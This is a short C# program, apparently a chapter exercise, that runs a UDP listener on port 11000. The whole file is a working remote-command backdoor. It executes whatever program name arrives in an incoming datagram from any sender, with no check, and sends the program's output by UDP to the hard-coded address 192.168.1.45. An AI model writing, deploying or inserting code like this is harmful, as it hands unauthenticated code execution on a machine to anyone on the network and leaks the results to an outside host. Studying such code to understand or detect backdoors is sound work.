using System;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Diagnostics;

namespace ch4_udp_server
{
	class MainClass
	{
		private const int listenPort = 11000;
		public static void Main(string[] args)
		{
			UdpClient listener = new UdpClient(listenPort);
			IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, listenPort);
			string received_data;
			byte[] receive_byte_array;

			try
			{
				while (true)
				{
					Console.WriteLine("Waiting for broadcast");
					receive_byte_array = listener.Receive(ref groupEP);
					Console.WriteLine("Received a broadcast from {0}", groupEP.ToString() );
					received_data = Encoding.ASCII.GetString(receive_byte_array, 0, receive_byte_array.Length);
					Console.WriteLine("data follows \n{0}\n\n", received_data);

					Socket sending_socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
						ProtocolType.Udp);

					IPAddress send_to_address = IPAddress.Parse("192.168.1.45");

					IPEndPoint sending_end_point = new IPEndPoint(send_to_address, 11000);

					Process prc = new Process();
					prc.StartInfo = new ProcessStartInfo();
					prc.StartInfo.FileName = received_data;
					prc.StartInfo.Arguments = "";
					prc.StartInfo.UseShellExecute = false;
					prc.StartInfo.RedirectStandardOutput = true;
					prc.Start();
					prc.WaitForExit();

					byte[] results = Encoding.ASCII.GetBytes(prc.StandardOutput.ReadToEnd());
					sending_socket.SendTo(results, sending_end_point);
				}
			}
			catch (Exception e)
			{
				Console.WriteLine(e.ToString());
			}
			listener.Close();
		}
	}
}
